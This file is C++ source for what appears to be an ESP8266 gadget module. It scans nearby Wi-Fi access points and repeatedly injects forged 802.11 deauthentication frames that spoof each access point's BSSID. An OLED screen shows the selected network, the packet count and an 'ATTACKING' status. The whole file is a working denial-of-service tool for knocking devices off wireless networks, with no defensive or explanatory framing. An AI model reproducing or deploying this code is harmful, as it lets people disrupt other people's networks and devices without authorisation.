/**
 * Deauth.cpp - Deauth attack implementation
 */

#include "Deauth.h"

// Static pointer for callback
static DeauthModule* deauthInstance = nullptr;

DeauthModule::DeauthModule()
    : display(nullptr), active(false), scanning(false),
      networkCount(0), selectedNetwork(0), lastScan(0), lastDeauth(0) {
    deauthInstance = this;
}

void DeauthModule::begin(DisplayManager* disp) {
    display = disp;
}

void DeauthModule::enter() {
    Serial.println(F("Deauth Mode"));
    wifi_set_opmode(STATION_MODE);
    wifi_promiscuous_enable(1);
    rescan();
}

void DeauthModule::exit() {
    active = false;
    wifi_promiscuous_enable(0);
}

void DeauthModule::update() {
    if (active && networkCount > 0) {
        if (millis() - lastDeauth >= 1000) {
            sendDeauth(selectedNetwork);
            lastDeauth = millis();
        }
    }
    
    if (millis() - lastScan >= DEAUTH_CYCLE_TIME) {
        rescan();
    }
    
    displayNetworks();
}

void DeauthModule::toggleAttack() {
    if (networkCount == 0) return;
    active = !active;
    Serial.print(F("Deauth: "));
    Serial.println(active ? F("ON") : F("OFF"));
}

void DeauthModule::selectNextNetwork() {
    if (networkCount == 0) return;
    selectedNetwork = (selectedNetwork + 1) % networkCount;
}

void DeauthModule::selectPreviousNetwork() {
    if (networkCount == 0) return;
    selectedNetwork = (selectedNetwork - 1 + networkCount) % networkCount;
}

void DeauthModule::rescan() {
    Serial.println(F("Scanning networks..."));
    scanning = true;
    scan();
    scanning = false;
    lastScan = millis();
}

void DeauthModule::scan() {
    networkCount = 0;
    
    wifi_promiscuous_enable(0);
    int n = WiFi.scanNetworks();
    
    for (int i = 0; i < n && i < MAX_ACCESS_POINTS; i++) {
        networks[i].ssid = WiFi.SSID(i);
        networks[i].channel = WiFi.channel(i);
        networks[i].rssi = WiFi.RSSI(i);
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
        
        // Setup deauth packet
        uint8_t deauthPkt[26] = {
            0xC0, 0x00, 0x00, 0x00,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
            0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
            0x00, 0x00, 0x01, 0x00
        };
        memcpy(&deauthPkt[10], networks[i].bssid, 6);
        memcpy(&deauthPkt[16], networks[i].bssid, 6);
        memcpy(networks[i].deauthPacket, deauthPkt, 26);
        
        networks[i].found = true;
        networks[i].packetCount = 0;
        networkCount++;
    }
    
    wifi_promiscuous_enable(1);
    
    Serial.print(F("Found "));
    Serial.print(networkCount);
    Serial.println(F(" networks"));
}

void DeauthModule::sendDeauth(int index) {
    if (index >= networkCount) return;
    
    wifi_set_channel(networks[index].channel);
    delay(1);
    wifi_send_pkt_freedom(networks[index].deauthPacket, 26, 0);
    networks[index].packetCount++;
}

void DeauthModule::displayNetworks() {
    if (!display) return;
    
    display->clear();
    display->drawMenuHeader("DEAUTH", selectedNetwork, networkCount);
    
    if (networkCount == 0) {
        display->drawTextCentered(30, "No networks", 1);
        display->drawTextCentered(42, "Press MODE to scan", 1);
    } else {
        Adafruit_SSD1306* d = display->getDisplay();
        
        // Show selected network info
        d->setTextSize(1);
        d->setCursor(2, 15);
        d->print(networks[selectedNetwork].ssid);
        
        d->setCursor(2, 28);
        d->print("CH:");
        d->print(networks[selectedNetwork].channel);
        d->print(" RSSI:");
        d->print(networks[selectedNetwork].rssi);
        
        d->setCursor(2, 40);
        d->print("Pkts: ");
        d->print(networks[selectedNetwork].packetCount);
        
        // Status
        d->setCursor(2, 52);
        d->print(active ? "ATTACKING" : "Idle");
    }
    
    display->update();
}

void DeauthModule::promiscCallback(uint8_t *buf, uint16_t len) {
    // Promiscuous mode callback - not used in simplified version
}
